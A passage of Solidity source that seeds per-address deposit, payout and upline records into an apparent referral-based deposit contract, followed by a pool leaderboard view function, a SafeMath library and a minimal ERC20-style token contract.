_insertp1(0x296094D2281B15DCcD7e02e91800e52c70656Ed4,12125802700544000000,51410288473797627317,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,14009960506327174851,2570514423689881365);
_insertlvls(0x296094D2281B15DCcD7e02e91800e52c70656Ed4,1,148000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x296094D2281B15DCcD7e02e91800e52c70656Ed4,14511894819236433934,0,0,0,0);
_insertp(0x404BB2DB25a3af8F91F04FC7F23675BfC082A7D6,114212639073260867080,148000000000000000000,151572533756800000000,1670819142,1667801629,3346228752728393891,93399736708847832354,0);
_insertp1(0x404BB2DB25a3af8F91F04FC7F23675BfC082A7D6,0,93399736708847832354,0x296094D2281B15DCcD7e02e91800e52c70656Ed4,0,4669986835442391615);
_insertlvls(0x404BB2DB25a3af8F91F04FC7F23675BfC082A7D6,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x404BB2DB25a3af8F91F04FC7F23675BfC082A7D6,0,0,0,0,0);
_insertp(0x595593965177f87F885947623E8702dCE8bD9337,383836510753279942841,308000000000000000000,444505719355903897101,1670602212,1667804919,8167525889733120,221147089375421170441,169962468949692500523);
_insertp1(0x595593965177f87F885947623E8702dCE8bD9337,53858295790957144905,151673021506559885668,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,46630105289874070845,7583651075327994283);
_insertlvls(0x595593965177f87F885947623E8702dCE8bD9337,2,124000000000000000000,3,1201000000000000000000,1,100000000000000000000,0,0,0,0);
_insertlvlrois(0x595593965177f87F885947623E8702dCE8bD9337,45828765467158089689,47017493321874070845,0,0,0);
_insertp(0xd294CE0F6D830aE9c16B9014bb1b5DD76057D5C4,25000000000000000000,25000000000000000000,25000000000000000000,1667805654,1667805654,0,0,0);
_insertp1(0xd294CE0F6D830aE9c16B9014bb1b5DD76057D5C4,0,0,0x595593965177f87F885947623E8702dCE8bD9337,0,0);
_insertlvls(0xd294CE0F6D830aE9c16B9014bb1b5DD76057D5C4,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xd294CE0F6D830aE9c16B9014bb1b5DD76057D5C4,0,0,0,0,0);
_insertp(0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,130881303904150657498,190000000000000000000,310385314124473337648,1670920006,1667808288,2765160686472108,160025511164552207473,15041466535690013124);
_insertp1(0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,179679348767575413221,448760025550806700699,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,138537153114138311689,22438001277540335019);
_insertlvls(0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,6,1172000000000000000000,8,362000000000000000000,1,25000000000000000000,0,0,0,0);
_insertlvlrois(0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,139004427876318481717,138623624493582783217,0,0,0);
_insertp(0xEdad70edAA64260C6112ef18A9b34Cd019D61209,836503067628800000000,1001000000000000000000,1001000000000000000000,1670670295,1667896739,113735900678400000000,575739263299200000000,0);
_insertp1(0xEdad70edAA64260C6112ef18A9b34Cd019D61209,0,575739263299200000000,0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,0,28786963164960000000);
_insertlvls(0xEdad70edAA64260C6112ef18A9b34Cd019D61209,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xEdad70edAA64260C6112ef18A9b34Cd019D61209,0,0,0,0,0);
_insertp(0x3Ff1935a38f1F810E13A403Df2691B431627a38F,79204344544647078236,47000000000000000000,111818766611444718516,1670914610,1667830597,3115165081201133520,59025988451912043781,0);
_insertp1(0x3Ff1935a38f1F810E13A403Df2691B431627a38F,13639807638480406111,81536055166994100855,0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,8870259076601650963,4076802758349705038);
_insertlvls(0x3Ff1935a38f1F810E13A403Df2691B431627a38F,2,155000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x3Ff1935a38f1F810E13A403Df2691B431627a38F,10860486255140489983,0,0,0,0);
_insertp(0xA9e00F04D5510AD6E9c8369539aE98AA70069e49,91843571276734007190,100000000000000000000,115497595481005076400,1670585526,1667978430,13268181190258926804,59135060510677673104,0);
_insertp1(0xA9e00F04D5510AD6E9c8369539aE98AA70069e49,0,59135060510677673104,0x3Ff1935a38f1F810E13A403Df2691B431627a38F,0,2956753025533883653);
_insertlvls(0xA9e00F04D5510AD6E9c8369539aE98AA70069e49,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xA9e00F04D5510AD6E9c8369539aE98AA70069e49,0,0,0,0,0);
_insertp(0x486AaC15b47c4923010b9711a9552e466fEc8694,155768899971213905825,84000000000000000000,250692407052907223265,1670916692,1668005033,30848402626599981,65425924096659208507,11798192961826681066);
_insertp1(0x486AaC15b47c4923010b9711a9552e466fEc8694,143478582264496854697,237308767704233293852,0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,40202454304903911714,11865438385211664685);
_insertlvls(0x486AaC15b47c4923010b9711a9552e466fEc8694,6,207000000000000000000,1,25000000000000000000,0,0,0,0,0,0);
_insertlvlrois(0x486AaC15b47c4923010b9711a9552e466fEc8694,41506687228255144359,0,0,0,0);
_insertp(0xAcCDDF7496b5F2471ed90770AeaF7b2D5a37eD5E,51902428322467339118,40000000000000000000,63253858260134813668,1670808273,1668060362,1974438940116581472,28378574844168686589,0);
_insertp1(0xAcCDDF7496b5F2471ed90770AeaF7b2D5a37eD5E,0,28378574844168686589,0x85D1749CdF2Ee4160BaebA4C546fE640b46833Fa,0,1418928742208434323);
_insertlvls(0xAcCDDF7496b5F2471ed90770AeaF7b2D5a37eD5E,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xAcCDDF7496b5F2471ed90770AeaF7b2D5a37eD5E,0,0,0,0,0);
_insertp(0x75C9Ad37d96e461Ef21837E1237F88a55823eBd6,55000000000000000000,55000000000000000000,55000000000000000000,1668061873,1668061873,0,0,0);
_insertp1(0x75C9Ad37d96e461Ef21837E1237F88a55823eBd6,0,0,0x3Ff1935a38f1F810E13A403Df2691B431627a38F,0,0);
_insertlvls(0x75C9Ad37d96e461Ef21837E1237F88a55823eBd6,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x75C9Ad37d96e461Ef21837E1237F88a55823eBd6,0,0,0,0,0);
_insertp(0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,89438659450000000000,50000000000000000000,120989587010000000000,1670699498,1668084224,3930303177768526400,52564199381353692288,150346226190952739571);
_insertp1(0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,113848773608981904438,78877318900000000000,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,62810572100617142845,3943865945000000000);
_insertlvls(0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,2,652000000000000000000,4,1854000000000000000000,1,67000000000000000000,0,0,0,0);
_insertlvlrois(0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,61205060041554731002,63970612876937142845,0,0,0);
_insertp(0x21CD9C57502532fc61a39A8517489ccBEef0C27B,491798205442666666675,601000000000000000000,601000000000000000000,1670826360,1668164919,16742883014400000000,327605383672000000000,0);
_insertp1(0x21CD9C57502532fc61a39A8517489ccBEef0C27B,0,327605383672000000000,0xac38064692750Cb22447E1902B2549c352fa2E1c,0,16380269183600000000);
_insertlvls(0x21CD9C57502532fc61a39A8517489ccBEef0C27B,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x21CD9C57502532fc61a39A8517489ccBEef0C27B,0,0,0,0,0);
_insertp(0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,44662810151619179341,51000000000000000000,122712231942573805491,1670699498,1668264988,3584536540650587716,43341067529087099508,3214788810240000000);
_insertp1(0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,103134786809536000000,195123554477386565465,0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,51862488949003465957,9756177723869328269);
_insertlvls(0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,3,1253000000000000000000,1,67000000000000000000,0,0,0,0,0,0);
_insertlvlrois(0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,53602550113483465957,26551467174400000000,0,0,0);
_insertp(0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,425777901385032951267,601000000000000000000,601000000000000000000,1670924814,1668430106,276409996800000000,301781182952000000000,56014347102698853764);
_insertp1(0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,192640000000000000000,525666295844901146236,0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,87259459995600000000,26283314792245057306);
_insertlvls(0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,4,2408000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,87390637621200000000,0,0,0,0);
_insertp(0x120A9afe0d5cA7c71C5A33c95913F976c120b775,26000000000000000000,26000000000000000000,26000000000000000000,1668431189,1668431189,0,0,0);
_insertp1(0x120A9afe0d5cA7c71C5A33c95913F976c120b775,0,0,0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,0,0);
_insertlvls(0x120A9afe0d5cA7c71C5A33c95913F976c120b775,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x120A9afe0d5cA7c71C5A33c95913F976c120b775,0,0,0,0,0);
_insertp(0x5385f3AD4aAB8a6Aa2B86251976633aCB18EE5C0,23187091680000000000,25000000000000000000,25000000000000000000,1669214667,1668433241,4532270800000000000,4532270800000000000,0);
_insertp1(0x5385f3AD4aAB8a6Aa2B86251976633aCB18EE5C0,0,4532270800000000000,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,226613540000000000);
_insertlvls(0x5385f3AD4aAB8a6Aa2B86251976633aCB18EE5C0,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x5385f3AD4aAB8a6Aa2B86251976633aCB18EE5C0,0,0,0,0,0);
_insertp(0x6B2eD2bB3B8419b8263A32c4986d0914d8FC02bE,509625980962666666669,601000000000000000000,601000000000000000000,1670928444,1668435227,874517504000000000,301439351460800000000,27317294348799999998);
_insertp1(0x6B2eD2bB3B8419b8263A32c4986d0914d8FC02bE,0,274122057112000000002,0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,0,13706102855600000000);
_insertlvls(0x6B2eD2bB3B8419b8263A32c4986d0914d8FC02bE,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x6B2eD2bB3B8419b8263A32c4986d0914d8FC02bE,0,0,0,0,0);
_insertp(0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,102935585403980279862,99000000000000000000,187680104454484311332,1670602212,1668504171,3448509311288476,67257876586977302616,11135109799859623899);
_insertp1(0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,98355508483942400000,211861297626260078717,0x595593965177f87F885947623E8702dCE8bD9337,57383022355200000000,10593064881313003935);
_insertlvls(0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,3,1201000000000000000000,1,100000000000000000000,0,0,0,0,0,0);
_insertlvlrois(0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,57964104403200000000,56608702867200000000,0,0,0);
_insertp(0x2a0D6db68D76a278cb5BBE37F0C18954229fc992,908482679808365714290,1001000000000000000000,1021147175521280000000,1670602044,1668504297,39500593421274368212,425826328416474368212,40365094241754368212);
_insertp1(0x2a0D6db68D76a278cb5BBE37F0C18954229fc992,8280378644480000000,394325734995200000000,0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,584122176000000000,19716286749760000000);
_insertlvls(0x2a0D6db68D76a278cb5BBE37F0C18954229fc992,1,100000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x2a0D6db68D76a278cb5BBE37F0C18954229fc992,1168244352000000000,0,0,0,0);
_insertp(0xc6B15A81C31f453e99634f39AEC323a97aBf629b,509770209423466666668,601000000000000000000,601000000000000000000,1670819850,1668511849,28985570342400000000,273689371729600000000,0);
_insertp1(0xc6B15A81C31f453e99634f39AEC323a97aBf629b,0,273689371729600000000,0x56cD45cd4B2136A70067B72a55Bf862960B702a3,0,13684468586480000000);
_insertlvls(0xc6B15A81C31f453e99634f39AEC323a97aBf629b,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xc6B15A81C31f453e99634f39AEC323a97aBf629b,0,0,0,0,0);
_insertp(0xb9DBbe7968718d28C39dAa87D9Db92daA444a40d,549620832456533333334,601000000000000000000,601000000000000000000,1669895170,1668512498,93475212800000000,154230977843200000000,48173475212800000000);
_insertp1(0xb9DBbe7968718d28C39dAa87D9Db92daA444a40d,48080000000000000000,154137502630400000000,0xC30aF5e45a9d41B2724b18ebA9Df16190AA100B8,0,7706875131520000000);
_insertlvls(0xb9DBbe7968718d28C39dAa87D9Db92daA444a40d,1,601000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0xb9DBbe7968718d28C39dAa87D9Db92daA444a40d,0,0,0,0,0);
_insertp(0x26B9d2601E763c5B5a5Ca36B048C307BC6EDd518,533124116056347853428,601000000000000000000,612059835119200000000,1670645191,1668604607,48183289226141081625,228869834527756439720,0);
_insertp1(0x26B9d2601E763c5B5a5Ca36B048C307BC6EDd518,5360000000000000000,236807157188556439720,0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,2577322660800000000,11840357859427821985);
_insertlvls(0x26B9d2601E763c5B5a5Ca36B048C307BC6EDd518,1,67000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x26B9d2601E763c5B5a5Ca36B048C307BC6EDd518,5154645321600000000,0,0,0,0);
_insertp(0x061cD63aAa9c16Ec034C8Df450E0bE04A4F07C33,45765886679040000000,51000000000000000000,51000000000000000000,1669989401,1668606997,13085283302400000000,13085283302400000000,0);
_insertp1(0x061cD63aAa9c16Ec034C8Df450E0bE04A4F07C33,0,13085283302400000000,0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,0,654264165120000000);
_insertlvls(0x061cD63aAa9c16Ec034C8Df450E0bE04A4F07C33,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x061cD63aAa9c16Ec034C8Df450E0bE04A4F07C33,0,0,0,0,0);
_insertp(0xa09Cf31059CBE123A699E341bBD23282ecDfF0E0,60127139571200000000,67000000000000000000,67000000000000000000,1669989341,1668607606,17182151072000000000,17182151072000000000,0);
_insertp1(0xa09Cf31059CBE123A699E341bBD23282ecDfF0E0,0,17182151072000000000,0x26B9d2601E763c5B5a5Ca36B048C307BC6EDd518,0,859107553600000000);
_insertlvls(0xa09Cf31059CBE123A699E341bBD23282ecDfF0E0,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xa09Cf31059CBE123A699E341bBD23282ecDfF0E0,0,0,0,0,0);
_insertp(0xFf64533dD023882DED35354BFB10631D539b8824,1521291735975255062681,1500000000000000000000,1599981112003251216191,1670869399,1668478760,8694886155674884305,268614323347802816562,0);
_insertp1(0xFf64533dD023882DED35354BFB10631D539b8824,0,268614323347802816562,0x486AaC15b47c4923010b9711a9552e466fEc8694,0,13430716167390140821);
_insertlvls(0xFf64533dD023882DED35354BFB10631D539b8824,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xFf64533dD023882DED35354BFB10631D539b8824,0,0,0,0,0);
_insertp(0xE164e344C643430baf5151C4c6cEDDc80Ac3CccA,533530858901333333336,605000000000000000000,605000000000000000000,1670774803,1668928989,45169869184000000000,214407423296000000000,0);
_insertp1(0xE164e344C643430baf5151C4c6cEDDc80Ac3CccA,0,214407423296000000000,0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,0,10720371164800000000);
_insertlvls(0xE164e344C643430baf5151C4c6cEDDc80Ac3CccA,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xE164e344C643430baf5151C4c6cEDDc80Ac3CccA,0,0,0,0,0);
_insertp(0x87c34D32aFb71436f53338e9283cbEe09183A1c0,601000000000000000000,601000000000000000000,601000000000000000000,1669895170,1669895170,0,0,0);
_insertp1(0x87c34D32aFb71436f53338e9283cbEe09183A1c0,0,0,0xb9DBbe7968718d28C39dAa87D9Db92daA444a40d,0,0);
_insertlvls(0x87c34D32aFb71436f53338e9283cbEe09183A1c0,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x87c34D32aFb71436f53338e9283cbEe09183A1c0,0,0,0,0,0);
_insertp(0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,51168746318113878778,29000000000000000000,262623334094155822178,1670917737,1666115630,3168287902511702,117313158196182488227,28674477907997629458);
_insertp1(0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,207660000000000000000,528636469440104858769,0x96C574b6Da696BB52063007017C2411E8F48A857,234274969069120000000,26431823472005242928);
_insertlvls(0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,8,1383000000000000000000,4,1829000000000000000000,5,3009000000000000000000,0,0,0,0);
_insertlvlrois(0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,234382683077760000000,234107444309760000000,234318694944320000000,0,0);
_insertp(0x77A737127287c2e7272A5C02565DF509A684003F,570080600772266666669,601000000000000000000,601000000000000000000,1670891559,1670059987,11600407763200000000,92758197683200000000,0);
_insertp1(0x77A737127287c2e7272A5C02565DF509A684003F,0,92758197683200000000,0x68aF1EFea748c6aBDB3805B83a005cdfbf65264e,0,4637909884160000000);
_insertlvls(0x77A737127287c2e7272A5C02565DF509A684003F,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x77A737127287c2e7272A5C02565DF509A684003F,0,0,0,0,0);
_insertp(0x4ac9E1259f6c722974537a2469A229503E8E9C5a,601000000000000000000,601000000000000000000,601000000000000000000,1670308611,1670308611,0,0,0);
_insertp1(0x4ac9E1259f6c722974537a2469A229503E8E9C5a,0,0,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,0);
_insertlvls(0x4ac9E1259f6c722974537a2469A229503E8E9C5a,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x4ac9E1259f6c722974537a2469A229503E8E9C5a,0,0,0,0,0);
_insertp(0x09cc0a711082b7fF3537088280c0aDDE5b6524Da,101947073920000000000,100000000000000000000,103504733056000000000,1670602044,1670392230,3894147840000000000,3894147840000000000,0);
_insertp1(0x09cc0a711082b7fF3537088280c0aDDE5b6524Da,0,3894147840000000000,0x2a0D6db68D76a278cb5BBE37F0C18954229fc992,0,194707392000000000);
_insertlvls(0x09cc0a711082b7fF3537088280c0aDDE5b6524Da,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x09cc0a711082b7fF3537088280c0aDDE5b6524Da,0,0,0,0,0);
_insertp(0xa17bCC8bB62637c74Fd51bf55120066310A11a6A,101942174080000000000,100000000000000000000,103495913344000000000,1670602113,1670392827,3884348160000000000,3884348160000000000,0);
_insertp1(0xa17bCC8bB62637c74Fd51bf55120066310A11a6A,0,3884348160000000000,0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,0,194217408000000000);
_insertlvls(0xa17bCC8bB62637c74Fd51bf55120066310A11a6A,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xa17bCC8bB62637c74Fd51bf55120066310A11a6A,0,0,0,0,0);
_insertp(0xD88DeBa808C2Df2eeBF30F9C488928a0A5AEcE65,101936940160000000000,100000000000000000000,103486492288000000000,1670602212,1670393490,3873880320000000000,3873880320000000000,0);
_insertp1(0xD88DeBa808C2Df2eeBF30F9C488928a0A5AEcE65,0,3873880320000000000,0xDBA7A0E5A607070285c183Fb0237D958830Fb63e,0,193694016000000000);
_insertlvls(0xD88DeBa808C2Df2eeBF30F9C488928a0A5AEcE65,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xD88DeBa808C2Df2eeBF30F9C488928a0A5AEcE65,0,0,0,0,0);
_insertp(0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,188851093195917597078,101000000000000000000,276437474750497117128,1670872476,1670395971,921521350629226770,14790932779888800201,3079335740160000000);
_insertp1(0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,192160000000000000000,218965953886448800201,0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,15094356846720000000,10948297694322440007);
_insertlvls(0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,2,2402000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,16474750350720000000,0,0,0,0);
_insertp(0x8c71aAB3F3f1cC7e9FBd01Ab61C83f4Bb93B6E40,70000000000000000000,70000000000000000000,70000000000000000000,1670413729,1670413729,0,0,0);
_insertp1(0x8c71aAB3F3f1cC7e9FBd01Ab61C83f4Bb93B6E40,0,0,0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,0,0);
_insertlvls(0x8c71aAB3F3f1cC7e9FBd01Ab61C83f4Bb93B6E40,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x8c71aAB3F3f1cC7e9FBd01Ab61C83f4Bb93B6E40,0,0,0,0,0);
_insertp(0x9C7346e574927Ae5D44057BE4C5816A0fd51Dd77,588430075063466666667,601000000000000000000,601000000000000000000,1670836058,1670497992,37709774809600000000,37709774809600000000,0);
_insertp1(0x9C7346e574927Ae5D44057BE4C5816A0fd51Dd77,0,37709774809600000000,0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,0,1885488740480000000);
_insertlvls(0x9C7346e574927Ae5D44057BE4C5816A0fd51Dd77,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x9C7346e574927Ae5D44057BE4C5816A0fd51Dd77,0,0,0,0,0);
_insertp(0xC556b701477E08D1f4C7cce65E26fE2b98004b7f,49000000000000000000,49000000000000000000,49000000000000000000,1670578655,1670578655,0,0,0);
_insertp1(0xC556b701477E08D1f4C7cce65E26fE2b98004b7f,0,0,0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,0,0);
_insertlvls(0xC556b701477E08D1f4C7cce65E26fE2b98004b7f,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xC556b701477E08D1f4C7cce65E26fE2b98004b7f,0,0,0,0,0);
_insertp(0x185ec1563F4756281bb5d2750EFcfbA597bFC4C8,30781467767646721959,30000000000000000000,32126166302959467539,1670824208,1670579647,601357560547737,1361746338281863986,0);
_insertp1(0x185ec1563F4756281bb5d2750EFcfbA597bFC4C8,2000000000000000000,3361746338281863986,0x486AaC15b47c4923010b9711a9552e466fEc8694,0,168087316914093199);
_insertlvls(0x185ec1563F4756281bb5d2750EFcfbA597bFC4C8,1,25000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x185ec1563F4756281bb5d2750EFcfbA597bFC4C8,0,0,0,0,0);
_insertp(0x57Eb7F75853b7F1f865AdD60d04fB1190e54df4d,591608938754133333334,601000000000000000000,601000000000000000000,1670857862,1670605291,28173183737600000000,28173183737600000000,0);
_insertp1(0x57Eb7F75853b7F1f865AdD60d04fB1190e54df4d,0,28173183737600000000,0xBa7c8C128BfbB9171A6B4ce757186B8A2f4Cc2E3,0,1408659186880000000);
_insertlvls(0x57Eb7F75853b7F1f865AdD60d04fB1190e54df4d,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x57Eb7F75853b7F1f865AdD60d04fB1190e54df4d,0,0,0,0,0);
_insertp(0x720a8Eec58c6B537Bfe4114f8E9754c2Bca7076b,1338612248074084406420,1352000000000000000000,1352000000000000000000,1670917439,1670687485,11326281574400000000,57702633164800000000,10845501424095422350);
_insertp1(0x720a8Eec58c6B537Bfe4114f8E9754c2Bca7076b,0,46857131740704577650,0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,0,2342856587035228882);
_insertlvls(0x720a8Eec58c6B537Bfe4114f8E9754c2Bca7076b,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x720a8Eec58c6B537Bfe4114f8E9754c2Bca7076b,0,0,0,0,0);
_insertp(0x8fFF3754D882e2b85075658ed45C5ad667280eE1,1040364631680000000000,1050000000000000000000,1050000000000000000000,1670919491,1670699220,9202623360000000000,42926412480000000000,9202623359999999999);
_insertp1(0x8fFF3754D882e2b85075658ed45C5ad667280eE1,0,33723789120000000001,0xc0267b61Ca9FfCdCB2E65403Fd5B0e899704D2dA,0,1686189456000000000);
_insertlvls(0x8fFF3754D882e2b85075658ed45C5ad667280eE1,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x8fFF3754D882e2b85075658ed45C5ad667280eE1,0,0,0,0,0);
_insertp(0x89bBb6751a8917F381E687866B6348A5c51cCE85,32000000000000000000,32000000000000000000,32000000000000000000,1670749427,1670749427,0,0,0);
_insertp1(0x89bBb6751a8917F381E687866B6348A5c51cCE85,0,0,0x486AaC15b47c4923010b9711a9552e466fEc8694,0,0);
_insertlvls(0x89bBb6751a8917F381E687866B6348A5c51cCE85,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x89bBb6751a8917F381E687866B6348A5c51cCE85,0,0,0,0,0);
_insertp(0xdd8fd3766b94f4221f56513dbDc470F5a46FA0EC,25000000000000000000,25000000000000000000,25000000000000000000,1670765873,1670765873,0,0,0);
_insertp1(0xdd8fd3766b94f4221f56513dbDc470F5a46FA0EC,0,0,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,0);
_insertlvls(0xdd8fd3766b94f4221f56513dbDc470F5a46FA0EC,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xdd8fd3766b94f4221f56513dbDc470F5a46FA0EC,0,0,0,0,0);
_insertp(0x3034cd35734511748cb11cfb6492fB45EF77edB0,25000000000000000000,25000000000000000000,25000000000000000000,1670767840,1670767840,0,0,0);
_insertp1(0x3034cd35734511748cb11cfb6492fB45EF77edB0,0,0,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,0);
_insertlvls(0x3034cd35734511748cb11cfb6492fB45EF77edB0,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x3034cd35734511748cb11cfb6492fB45EF77edB0,0,0,0,0,0);
_insertp(0xEa8F5531a63299F5dE0d7c00e1a24D33EcB50431,25000000000000000000,25000000000000000000,25000000000000000000,1670774506,1670774506,0,0,0);
_insertp1(0xEa8F5531a63299F5dE0d7c00e1a24D33EcB50431,0,0,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,0);
_insertlvls(0xEa8F5531a63299F5dE0d7c00e1a24D33EcB50431,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0xEa8F5531a63299F5dE0d7c00e1a24D33EcB50431,0,0,0,0,0);
_insertp(0x3176807bD9f5e9f2F81Ca35D75Eda2BAbc7fD2E5,25000000000000000000,25000000000000000000,25000000000000000000,1670824100,1670824100,0,0,0);
_insertp1(0x3176807bD9f5e9f2F81Ca35D75Eda2BAbc7fD2E5,0,0,0x185ec1563F4756281bb5d2750EFcfbA597bFC4C8,0,0);
_insertlvls(0x3176807bD9f5e9f2F81Ca35D75Eda2BAbc7fD2E5,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x3176807bD9f5e9f2F81Ca35D75Eda2BAbc7fD2E5,0,0,0,0,0);

    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
}
library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}

contract Token {
   mapping(address => uint256) balances;
   mapping(address => mapping (address => uint256)) allowed;
   string name_;
   string symbol_;
   uint256 totalSupply_;   constructor(string memory _name, string memory _symbol, uint256 _total) {
      name_ = _name;
      symbol_ = _symbol;
      totalSupply_ = _total;
      balances[msg.sender] = totalSupply_;
   }
   
   function name() public view returns (string memory) {
      return name_;
   }   function symbol() public view returns (string memory) {
      return symbol_;
   }   function totalSupply() public view returns (uint256) {
      return totalSupply_;
   }   function balanceOf(address tokenOwner) public view returns (uint) {
      return balances[tokenOwner];
   }   function decimals() public pure returns(uint8) {
      return 18;
   }   function transfer(address _receiver, uint _amount) public returns (bool) {
      require(_amount <= balances[msg.sender]);
      balances[msg.sender] -= _amount;
      balances[_receiver] += _amount;
      return true;
   }   function approve(address _delegate, uint _amount) public returns (bool) {
      allowed[msg.sender][_delegate] = _amount;
      return true;
   }   function allowance(address _owner, address _delegate) public view returns (uint) {
      return allowed[_owner][_delegate];
   }   function transferFrom(address _owner, address _receiver, uint _amount) public returns (bool) {
      require(_amount <= balances[_owner]);
      require(_amount <= allowed[_owner][msg.sender]);          
      balances[_owner] -= _amount;
      allowed[_owner][msg.sender] -= _amount;
      balances[_receiver] += _amount;
      return true; 
   }
   
}